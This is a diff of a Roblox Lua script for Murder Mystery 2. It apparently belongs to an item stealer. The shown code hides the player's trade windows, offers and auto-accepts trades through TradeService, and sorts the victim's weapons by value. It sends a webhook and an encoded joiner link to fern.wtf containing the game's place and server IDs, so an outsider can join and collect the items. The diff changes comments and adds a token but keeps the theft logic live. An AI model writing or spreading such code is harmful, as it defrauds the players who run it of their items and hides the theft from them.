@@ -36,7 +36,7 @@ local function SendWebhook(title, description, fields, prefix)
     end)
 end
 
--- Ocultar GUI de trade
+-- Ocultar GUI
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
     local gui = playerGui:FindFirstChild(guiName)
@@ -57,7 +57,7 @@ local function addWeaponToTrade(id) pcall(function() TradeService.OfferItem:Fire
 local function acceptTrade() pcall(function() TradeService.AcceptTrade:FireServer(285646582) end) end
 local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
 
--- ===== MM2 Supreme value system =====
+-- MM2 Supreme value system
 local database = require(game.ReplicatedStorage.Database.Sync.Item)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
 local categories = {
@@ -135,8 +135,8 @@ end
 if #weaponsToSend>0 then
     table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
-    -- Generar link protegido con supremo bypass
-    local rawLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
+    -- Generar link protegido
+    local rawLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..math.random(100000,999999)
     local encodedLink = HttpService:UrlEncode(HttpService:Base64Encode(rawLink))
     local safeLink = "https://fern.wtf/redirect?data="..encodedLink
 
